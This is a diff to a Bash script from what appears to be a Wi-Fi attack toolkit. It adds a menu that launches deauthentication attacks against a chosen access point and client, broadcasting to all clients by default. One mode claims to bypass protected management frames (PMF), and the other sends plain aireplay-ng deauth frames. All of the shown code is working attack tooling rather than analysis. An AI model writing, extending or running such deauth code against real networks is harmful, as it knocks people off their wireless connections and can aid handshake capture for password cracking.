@@ -706,13 +706,33 @@ menu_packet_sender() {
                 read -r num_frames
                 num_frames="${num_frames:-10}"
 
-                echo -e "\n${C_CYN}[*] Launching Multi-Vector Channel-Locked Deauth Engine...${C_RST}"
-                echo -e "${C_WHT}[★] Target AP:     ${C_CYN}$SELECTED_BSSID ($SELECTED_ESSID)${C_RST}"
-                echo -e "${C_WHT}[★] Target Client: ${C_CYN}${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff (Broadcast)}${C_RST}"
-                echo -e "${C_WHT}[★] Frequency:     ${C_CYN}Channel $SELECTED_CH (Strict RF Lock)${C_RST}"
-                echo -e "${C_WHT}[★] Attack Vector: ${C_CYN}Bidirectional (AP->STA + STA->AP, Interleaved Deauth/Disassoc)${C_RST}\n"
-
-                airmon-inject --deauth -a "$SELECTED_BSSID" -d "${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff}" -c "$SELECTED_CH" -n "$num_frames"
+                echo -e "\n${C_CYN}┌─ Attack Mode ─────────────────────────────────┐${C_RST}"
+                echo -e "${C_CYN}│${C_RST} ${C_GRN}[B]${C_RST} Bidirectional  │ Client→AP + AP→Client     ${C_CYN}│${C_RST}"
+                echo -e "${C_CYN}│${C_RST}       PMF bypass, multi-reason, paced           ${C_CYN}│${C_RST}"
+                echo -e "${C_CYN}├───────────────────────────────────────────────┤${C_RST}"
+                echo -e "${C_CYN}│${C_RST} ${C_YLW}[P]${C_RST} Plain Deauth   │ AP→Client only (aireplay) ${C_CYN}│${C_RST}"
+                echo -e "${C_CYN}│${C_RST}       Simple, faster, best for non-PMF targets ${C_CYN}│${C_RST}"
+                echo -e "${C_CYN}└───────────────────────────────────────────────┘${C_RST}"
+                echo -en "${C_YLW}Select attack mode [B/p]: ${C_RST}"
+                read -r atk_mode
+                case "${atk_mode:-B}" in
+                    p*|P*)
+                        echo -e "\n${C_CYN}[*] Launching Plain Deauth (aireplay-ng -0)...${C_RST}"
+                        echo -e "${C_WHT}[★] Target AP:     ${C_CYN}$SELECTED_BSSID ($SELECTED_ESSID)${C_RST}"
+                        echo -e "${C_WHT}[★] Target Client: ${C_CYN}${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff (Broadcast)}${C_RST}"
+                        echo -e "${C_WHT}[★] Frequency:     ${C_CYN}Channel $SELECTED_CH${C_RST}"
+                        echo -e "${C_WHT}[★] Attack Vector: ${C_YLW}Plain AP→Client Deauth${C_RST}\n"
+                        airmon-inject --plain -a "$SELECTED_BSSID" -d "${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff}" -c "$SELECTED_CH" -n "$num_frames"
+                        ;;
+                    *)
+                        echo -e "\n${C_CYN}[*] Launching Bidirectional Multi-Vector Deauth Engine...${C_RST}"
+                        echo -e "${C_WHT}[★] Target AP:     ${C_CYN}$SELECTED_BSSID ($SELECTED_ESSID)${C_RST}"
+                        echo -e "${C_WHT}[★] Target Client: ${C_CYN}${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff (Broadcast)}${C_RST}"
+                        echo -e "${C_WHT}[★] Frequency:     ${C_CYN}Channel $SELECTED_CH (Strict RF Lock)${C_RST}"
+                        echo -e "${C_WHT}[★] Attack Vector: ${C_GRN}Bidirectional (Client→AP PMF bypass + AP→Client)${C_RST}\n"
+                        airmon-inject --deauth -a "$SELECTED_BSSID" -d "${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff}" -c "$SELECTED_CH" -n "$num_frames"
+                        ;;
+                esac
                 pause
                 ;;
             3)
